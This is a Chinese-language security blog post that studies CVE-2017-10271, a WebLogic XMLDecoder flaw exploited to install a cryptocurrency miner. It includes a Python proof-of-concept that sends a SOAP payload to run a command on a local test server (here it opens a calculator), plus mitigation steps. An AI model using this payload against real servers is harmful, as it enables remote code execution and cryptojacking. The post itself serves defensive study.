---
title: Weblogic 漏洞被利用挖矿
date: 2018-01-22 18:13:23
tags:
		- Weblogic
categories:
		- 安全研究
---

`Weblogic`漏洞被利用来挖矿，客户受到了影响。学习一下其中的原理。

<!-- more -->

#### 背景

2017年12月中旬，安全研究者爆出未打补丁的`WebLogic`版本存在的漏洞，可能被`watch-smarted`挖矿恶意软件利用。

攻击者利用`Weblogic WLS`组件漏洞(`CVE-2017-10271`)，构造`payload`下载并执行虚拟币挖矿程序，对`Weblogic`中间件主机进行攻击。

**影响版本**

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-22/59187743.jpg)


#### 漏洞复现

[安装Webloginc](http://blog.csdn.net/acmman/article/details/70093877)

访问 `7001`端口

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-22/71865798.jpg)

脚本弹计算器。就是一个请求，把其中的恶意代码写在了`POST`的`xml`里面。关键是其中的利用代码的编写。



	#! -*- coding:utf-8 -*-
	import requests
	 
	url = "http://127.0.0.1"7001/wls-wsat/CoordinatorPorType"
	xml = '''
	    <soapenv:Envelope     xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
	
	    <soapenv:Header>
	       <work:WorkContext    xmlns:work="http://bea.com/2004/06/soap/workarea/">
	           <java      version="1.8" class="java.beans.XMLDecoder">
	                <void     class="java.lang.ProcessBuilder">
	                    <array    class="java.lang.String" length="3">
	                        <void     index="0">
	                            <string>calc</string>
	                        </void>
	                        <void     index="1">
	                            <string>/c</string>
	                        </void>
	                        <void     index="2">
	                            <string></string>
	                        </void>
	                    </array>
	                <void     method="start"/></void>
	           </java>
	       </work:WorkContext>
	   </soapenv:Header>
	    <soapenv:Body/>
	    </soapenv:Envelope>
	'''
	r =requests.post(url,headers={'Content-Type':'text/xml','Cache-Control':'no-cache'},data=xml)
	print r.status_code
	
	print r.text

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-22/13275873.jpg)

抓包修改

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-1-22/34403717.jpg)

#### 挖矿分析

使用`top`命令查看`CPU`利用情况。

通过`POC`可以知道，在xml中的string标签的字符串为远程执行的命令内容。攻击者首先下载`setup-watch`的`shell`脚本，其作用是下载并运行`watch-smartd`挖矿程序。

#### 漏洞分析

找了两篇从代码层面的分析文章，学习一下其中的原理。

[Weblogic XMLDecoder RCE分析](https://paper.seebug.org/487/)

[WebLogic WLS-WebServices组件反序列化漏洞分析](https://xianzhi.aliyun.com/forum/topic/1849)

#### 缓解措施

攻击者利用的是`wls-wsat`组件的`CoordinatorPorType`接口，若`Weblogic`服务器集群中应用此组件，建议临时备份后将此组件删除，并重启服务器。

根据自己服务器的实际路径，删除该组件

	rm -f/home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war 
	rm -f/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war 
	rm -rf/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat 

重启`Weblogic`服务

	


#### 参考

[Weblogic WLS 组件漏洞](http://blog.nsfocus.net/weblogic-solution/)

[利用WebLogic 漏洞挖矿事件分析](https://cert.360.cn/static/files/利用WebLogic漏洞挖矿事件分析.pdf)

[Weblogic XMLDecoder RCE分析](https://paper.seebug.org/487/)

[WebLogic WLS-WebServices组件反序列化漏洞分析](https://xianzhi.aliyun.com/forum/topic/1849)

[利用服务器漏洞挖矿黑产案例分析](http://www.freebuf.com/articles/system/129459.html)






